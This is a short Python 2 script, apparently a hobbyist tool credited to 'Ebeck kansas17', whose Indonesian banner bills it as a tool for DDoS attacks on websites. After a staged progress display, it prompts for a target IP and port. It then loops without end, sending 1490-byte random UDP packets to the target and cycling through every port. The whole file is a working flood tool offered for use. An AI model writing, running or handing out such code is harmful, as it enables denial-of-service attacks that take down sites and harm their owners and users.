 import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet Ebeck")
os.system("figlet kansas17")
print
print "TOOLS INI DI BUAT UNTUK MEN DDOS ATACK SEBUAH WEBSITE HARAP MENGGUNAKAN DENGAN BIJAK"
print "SEMAKIN BANYAK YG DDOS ATACK, SEMAKIN DWON SITUS TARGET"
print "____________________"
print "        |=|        "
print "10110101010101010101"
print "_________________________________________"
print "HAKED BY : Ebeck kansas17"
print "_____________________________"
print "|Author   : Ebeck kansas    |"
print "|Youtube  : Ebeck kansas17  |"
print "|TOOLS    : DDOS ATACK      |"
print "|Facebook : Termux usr      |"
print "|___________________________|"
print
ip = raw_input("IP Target ddos : ")
port = input("Port       : ")

os.system("clear")

print "[                    ] 0% "
time.sleep(5)
print "[=====>HACKED SETARTING...               ] 25%"
time.sleep(5)
print "[===================>RUN WEB CHEK IN          ] 50%"
time.sleep(5)
print "[======================>SEND IN ATACK     ] 75%"
time.sleep(5)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
